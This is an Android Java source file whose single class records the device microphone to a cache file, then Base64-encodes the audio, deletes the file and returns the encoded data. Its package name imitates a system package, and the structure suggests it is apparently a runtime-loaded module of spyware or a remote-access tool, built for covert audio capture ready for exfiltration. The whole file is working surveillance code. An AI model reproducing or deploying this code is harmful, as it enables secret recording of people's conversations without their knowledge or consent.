package com.android.a2faces;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Base64;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

class RuntimeClass {
    public RuntimeClass() {}

    public MediaRecorder run(Context context) {
        try {
            File audioFile = new File(context.getExternalCacheDir().getAbsolutePath(), "test.mp3");

            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);

            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

            recorder.prepare();

            recorder.start();
            return recorder;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    public String stop(MediaRecorder recorder, Context context) {
        try {
            recorder.stop();
            recorder.release();

            File audioFile = new File(context.getExternalCacheDir().getAbsolutePath(), "test.mp3");
            InputStream inputStream = new FileInputStream(audioFile.getAbsolutePath());
            byte[] bytes = new byte[(int)audioFile.length()];
            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);
            bufferedInputStream.read(bytes, 0, bytes.length);
            bufferedInputStream.close();

            String fileEncoded = Base64.encodeToString(bytes, Base64.DEFAULT);
            audioFile.delete();
            return fileEncoded;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }
}
